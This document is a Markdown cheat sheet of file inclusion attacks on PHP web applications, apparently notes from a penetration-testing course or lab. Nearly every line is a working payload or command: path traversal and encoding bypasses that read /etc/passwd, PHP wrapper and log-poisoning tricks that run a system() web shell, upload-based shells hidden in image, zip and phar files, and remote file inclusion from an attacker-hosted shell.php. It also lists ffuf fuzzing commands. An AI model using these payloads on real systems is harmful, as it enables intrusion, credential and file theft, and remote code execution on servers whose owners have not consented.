## Basic & Bypasses
```
/index.php?language=/etc/passwd
/index.php?language=../../../../etc/passwd
/index.php?language=/../../../etc/passwd
/index.php?language=./languages/../../../../etc/passwd
/index.php?language=languages/....//....//....//....//....//....//flag.txt

/index.php?language=....//....//....//....//etc/passwd
/index.php?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
/index.php?language=non_existing_directory/../../../etc/passwd/./././.[./ REPEATED ~2048 times]
/index.php?language=../../../../etc/passwd%00

ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://94.237.53.219:51683/FUZZ.php -c -ic
/index.php?language=php://filter/read=convert.base64-encode/resource=configure
```

## Remote Code Execution

**PHP Wrappers
```
/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id
curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id"
curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
```

**RFI
```
echo '<?php system($_GET["cmd"]); ?>' > shell.php && python3 -m http.server <LISTENING_PORT>
/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id
```

**LFI + Upload
```
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
/index.php?language=./profile_images/shell.gif&cmd=id
echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
/index.php?language=zip://shell.zip%23shell.php&cmd=id
php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
```

**Log Poisoning
```
/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd
/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id
curl -s "http://<SERVER_IP>:<PORT>/index.php" -A '<?php system($_GET["cmd"]); ?>'
/index.php?language=/var/log/apache2/access.log&cmd=id
```

## Misc

```
ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287
ffuf -w /opt/useful/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287
ffuf -w /opt/useful/SecLists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287
ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287

https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI
https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt
https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt
https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt
https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux
https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows
```

## File Inclusion Functions

<img width="775" height="887" alt="image" src="https://github.com/user-attachments/assets/5d87b380-f814-4169-8790-9761676aceeb" />
